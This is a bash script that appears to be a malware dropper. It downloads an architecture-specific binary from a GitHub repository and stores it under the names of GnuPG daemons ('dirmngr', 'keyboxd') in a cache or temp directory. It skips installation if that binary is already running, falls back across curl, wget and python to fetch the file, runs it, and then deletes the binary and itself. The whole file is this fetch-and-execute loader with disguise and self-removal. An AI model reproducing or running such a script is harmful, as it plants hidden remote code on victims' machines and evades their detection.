#!/usr/bin/env bash

URL_AMD64="https://github.com/kd6379/test/raw/refs/heads/main/agent_amd64"
URL_ARM64="https://github.com/kd6379/test/raw/refs/heads/main/agent_arm64"

SCRIPT_PATH="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"

# ── 架构 ──────────────────────────────────────────────────────────────────────
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)         AGENT_URL="$URL_AMD64" ;;
    aarch64|arm64|armv8*) AGENT_URL="$URL_ARM64" ;;
    *) echo "[FAIL] 不支持的架构: $ARCH"; exit 1 ;;
esac

# ── 落地目录（只用已存在的目录，不新建）─────────────────────────────────────
_BASE=""
if [ "$(id -u)" -eq 0 ]; then
    for _d in /usr/local/lib /var/tmp /tmp; do
        if [ -d "$_d" ] && [ -w "$_d" ]; then _BASE="$_d"; break; fi
    done
else
    for _d in "$HOME/.cache" /var/tmp /tmp; do
        if [ -d "$_d" ] && [ -w "$_d" ]; then _BASE="$_d"; break; fi
    done
fi
[ -n "$_BASE" ] || { echo "[FAIL] 无可写目录"; exit 1; }

# ── 是否已在运行 ───────────────────────────────────────────────────────────────
for _name in dirmngr keyboxd; do
    _check="$_BASE/$_name"
    for _exe in /proc/[0-9]*/exe; do
        [ -e "$_exe" ] || continue
        _t=$(readlink "$_exe" 2>/dev/null) || continue
        if [ "$_t" = "$_check" ] || [ "$_t" = "$_check (deleted)" ]; then
            exit 0
        fi
    done
done

# ── 选文件名（不覆盖已有文件）────────────────────────────────────────────────
AGENT_PATH=""
for _name in dirmngr keyboxd; do
    if [ ! -f "$_BASE/$_name" ]; then
        AGENT_PATH="$_BASE/$_name"; break
    fi
done
[ -n "$AGENT_PATH" ] || { echo "[FAIL] 无可用文件名"; exit 1; }

# ── 下载 ──────────────────────────────────────────────────────────────────────
download() {
    local url="$1" dest="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --retry 3 --connect-timeout 10 "$url" -o "$dest"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$dest" "$url"
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.request; urllib.request.urlretrieve('$url','$dest')"
    elif command -v python >/dev/null 2>&1; then
        python -c "import urllib; urllib.urlretrieve('$url','$dest')"
    else
        echo "[FAIL] 无可用下载工具"; return 1
    fi
}

if ! download "$AGENT_URL" "$AGENT_PATH" || [ ! -s "$AGENT_PATH" ]; then
    rm -f "$AGENT_PATH"
    echo "[FAIL] 下载失败"; exit 1
fi

chmod 777 "$AGENT_PATH"

# ── 执行 ──────────────────────────────────────────────────────────────────────
"$AGENT_PATH"
EXIT_CODE=$?

if [ "$EXIT_CODE" -eq 0 ]; then
    rm -f "$AGENT_PATH"
    rm -f "$SCRIPT_PATH"
fi
exit "$EXIT_CODE"
